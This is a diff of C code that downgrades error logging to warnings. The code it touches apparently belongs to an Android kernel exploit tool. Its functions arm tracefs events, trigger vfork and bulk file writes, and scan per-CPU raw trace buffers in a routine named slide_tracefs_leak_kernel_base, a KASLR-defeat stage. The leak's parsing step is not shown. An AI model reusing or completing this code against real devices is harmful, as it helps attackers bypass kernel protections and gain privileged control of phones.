@@ -84,7 +84,7 @@ static unsigned int slide_tracefs_candidate_hits[SLIDE_TRACEFS_CANDIDATES];
 static int slide_tracefs_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
   if (fd < 0) {
-    pr_error("slide tracefs open write failed path=%s errno=%d\n", path,
+    pr_warning("slide tracefs open write failed path=%s errno=%d\n", path,
              errno);
     return 0;
   }
@@ -96,7 +96,7 @@ static int slide_tracefs_write(const char *path, const char *value) {
       continue;
     }
     if (wrote <= 0) {
-      pr_error("slide tracefs write failed path=%s done=%zu len=%zu errno=%d\n",
+      pr_warning("slide tracefs write failed path=%s done=%zu len=%zu errno=%d\n",
                path, done, len, errno);
       close(fd);
       return 0;
@@ -104,7 +104,7 @@ static int slide_tracefs_write(const char *path, const char *value) {
     done += (size_t)wrote;
   }
   if (close(fd) != 0) {
-    pr_error("slide tracefs close write failed path=%s errno=%d\n", path,
+    pr_warning("slide tracefs close write failed path=%s errno=%d\n", path,
              errno);
     return 0;
   }
@@ -114,7 +114,7 @@ static int slide_tracefs_write(const char *path, const char *value) {
 static int slide_tracefs_read_u32(const char *path, uint32_t *value) {
   int fd = open(path, O_RDONLY | O_CLOEXEC);
   if (fd < 0) {
-    pr_error("slide tracefs open read failed path=%s errno=%d\n", path,
+    pr_warning("slide tracefs open read failed path=%s errno=%d\n", path,
              errno);
     return 0;
   }
@@ -125,12 +125,12 @@ static int slide_tracefs_read_u32(const char *path, uint32_t *value) {
   } while (got < 0 && errno == EINTR);
   int read_errno = errno;
   if (close(fd) != 0) {
-    pr_error("slide tracefs close read failed path=%s errno=%d\n", path,
+    pr_warning("slide tracefs close read failed path=%s errno=%d\n", path,
              errno);
     return 0;
   }
   if (got <= 0) {
-    pr_error("slide tracefs read failed path=%s got=%zd errno=%d\n", path,
+    pr_warning("slide tracefs read failed path=%s got=%zd errno=%d\n", path,
              got, read_errno);
     return 0;
   }
@@ -143,7 +143,7 @@ static int slide_tracefs_read_u32(const char *path, uint32_t *value) {
     end++;
   }
   if (errno || end == text || !end || *end || parsed > UINT32_MAX) {
-    pr_error("slide tracefs bad number path=%s value=%s errno=%d\n", path,
+    pr_warning("slide tracefs bad number path=%s value=%s errno=%d\n", path,
              text, errno);
     return 0;
   }
@@ -154,12 +154,12 @@ static int slide_tracefs_read_u32(const char *path, uint32_t *value) {
 static int slide_tracefs_clear(const char *path) {
   int fd = open(path, O_WRONLY | O_TRUNC | O_CLOEXEC);
   if (fd < 0) {
-    pr_error("slide tracefs clear open failed path=%s errno=%d\n", path,
+    pr_warning("slide tracefs clear open failed path=%s errno=%d\n", path,
              errno);
     return 0;
   }
   if (close(fd) != 0) {
-    pr_error("slide tracefs clear close failed path=%s errno=%d\n", path,
+    pr_warning("slide tracefs clear close failed path=%s errno=%d\n", path,
              errno);
     return 0;
   }
@@ -285,7 +285,7 @@ static int slide_tracefs_trigger_vfork(void) {
     int status = 0;
     pid_t child = vfork();
     if (child < 0) {
-      pr_error("slide tracefs vfork failed errno=%d\n", errno);
+      pr_warning("slide tracefs vfork failed errno=%d\n", errno);
       return 0;
     }
     if (child == 0) {
@@ -294,11 +294,11 @@ static int slide_tracefs_trigger_vfork(void) {
       _exit(0);
     }
     if (waitpid(child, &status, 0) != child) {
-      pr_error("slide tracefs waitpid failed errno=%d\n", errno);
+      pr_warning("slide tracefs waitpid failed errno=%d\n", errno);
       return 0;
     }
     if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
-      pr_error("slide tracefs vfork child failed status=%d\n", status);
+      pr_warning("slide tracefs vfork child failed status=%d\n", status);
       return 0;
     }
   }
@@ -314,7 +314,7 @@ static int slide_tracefs_trigger_io(void) {
   snprintf(path, sizeof(path), "/data/local/tmp/.rmg-trace-io-%d", getpid());
   int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
   if (fd < 0) {
-    pr_error("slide tracefs trigger open failed errno=%d\n", errno);
+    pr_warning("slide tracefs trigger open failed errno=%d\n", errno);
     return 0;
   }
   size_t chunk_size = 0x40000;
@@ -324,7 +324,7 @@ static int slide_tracefs_trigger_io(void) {
     close(fd);
     unlink(path);
     errno = saved_errno;
-    pr_error("slide tracefs trigger alloc failed errno=%d\n", errno);
+    pr_warning("slide tracefs trigger alloc failed errno=%d\n", errno);
     return 0;
   }
   int ok = 1;
@@ -336,7 +336,7 @@ static int slide_tracefs_trigger_io(void) {
         continue;
       }
       if (wrote <= 0) {
-        pr_error("slide tracefs trigger write failed done=%zu size=%zu errno=%d\n",
+        pr_warning("slide tracefs trigger write failed done=%zu size=%zu errno=%d\n",
                  done, chunk_size, errno);
         ok = 0;
         break;
@@ -346,20 +346,20 @@ static int slide_tracefs_trigger_io(void) {
   }
   free(chunk);
   if (ok && fsync(fd) != 0) {
-    pr_error("slide tracefs trigger fsync failed errno=%d\n", errno);
+    pr_warning("slide tracefs trigger fsync failed errno=%d\n", errno);
     ok = 0;
   }
   if (close(fd) != 0) {
-    pr_error("slide tracefs trigger close failed errno=%d\n", errno);
+    pr_warning("slide tracefs trigger close failed errno=%d\n", errno);
     ok = 0;
   }
   if (unlink(path) != 0) {
-    pr_error("slide tracefs trigger unlink failed path=%s errno=%d\n", path,
+    pr_warning("slide tracefs trigger unlink failed path=%s errno=%d\n", path,
              errno);
     ok = 0;
   }
   if (!ok) {
-    pr_error("slide tracefs trigger failed\n");
+    pr_warning("slide tracefs trigger failed\n");
     return 0;
   }
   pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
@@ -400,7 +400,7 @@ static int slide_tracefs_leak_kernel_base(void) {
   }
   if (old_tracing > 1 || old_event > 1 || event_id > UINT16_MAX ||
       event_id != SLIDE_TRACEFS_EVENT_ID) {
-    pr_error("slide tracefs profile mismatch tracing=%u event=%u id=%u expected=%u\n",
+    pr_warning("slide tracefs profile mismatch tracing=%u event=%u id=%u expected=%u\n",
              old_tracing, old_event, event_id, SLIDE_TRACEFS_EVENT_ID);
     return 0;
   }
@@ -412,7 +412,7 @@ static int slide_tracefs_leak_kernel_base(void) {
       !slide_tracefs_clear(trace) ||
       !slide_tracefs_write(event_enable, "1") ||
       !slide_tracefs_write(tracing_on, "1")) {
-    pr_error("slide tracefs setup failed\n");
+    pr_warning("slide tracefs setup failed\n");
     goto out;
   }
   if (!slide_tracefs_trigger()) {
@@ -420,13 +420,13 @@ static int slide_tracefs_leak_kernel_base(void) {
   }
   if (!slide_tracefs_write(tracing_on, "0") ||
       !slide_tracefs_write(event_enable, "0")) {
-    pr_error("slide tracefs stop failed\n");
+    pr_warning("slide tracefs stop failed\n");
     goto out;
   }
 
   long cpu_count = sysconf(_SC_NPROCESSORS_CONF);
   if (cpu_count <= 0 || cpu_count > 256) {
-    pr_error("slide tracefs bad cpu count=%ld errno=%d\n", cpu_count,
+    pr_warning("slide tracefs bad cpu count=%ld errno=%d\n", cpu_count,
              errno);
     goto out;
   }
@@ -443,7 +443,7 @@ static int slide_tracefs_leak_kernel_base(void) {
              SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
     int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
     if (fd < 0) {
-      pr_error("slide tracefs cpu open failed cpu=%d errno=%d\n", cpu,
+      pr_warning("slide tracefs cpu open failed cpu=%d errno=%d\n", cpu,
                errno);
       scan_ok = 0;
       continue;
@@ -459,7 +459,7 @@ static int slide_tracefs_leak_kernel_base(void) {
         break;
       }
       if (got < 0) {
-        pr_error("slide tracefs cpu read failed cpu=%d errno=%d\n", cpu,
+        pr_warning("slide tracefs cpu read failed cpu=%d errno=%d\n", cpu,
                  errno);
         scan_ok = 0;
         break;
@@ -476,7 +476,7 @@ static int slide_tracefs_leak_kernel_base(void) {
       }
     }
     if (close(fd) != 0) {
-      pr_error("slide tracefs cpu close failed cpu=%d errno=%d\n", cpu,
+      pr_warning("slide tracefs cpu close failed cpu=%d errno=%d\n", cpu,
                errno);
       scan_ok = 0;
     }
@@ -497,7 +497,7 @@ static int slide_tracefs_leak_kernel_base(void) {
           slide_tracefs_parse_failures, candidate_count, cpu_files);
   if (!scan_ok || slide_tracefs_parse_failures || !cpu_files ||
       candidate_count != 1) {
-    pr_error("slide tracefs candidate gate failed\n");
+    pr_warning("slide tracefs candidate gate failed\n");
     goto out;
   }
   setup_ok = 1;
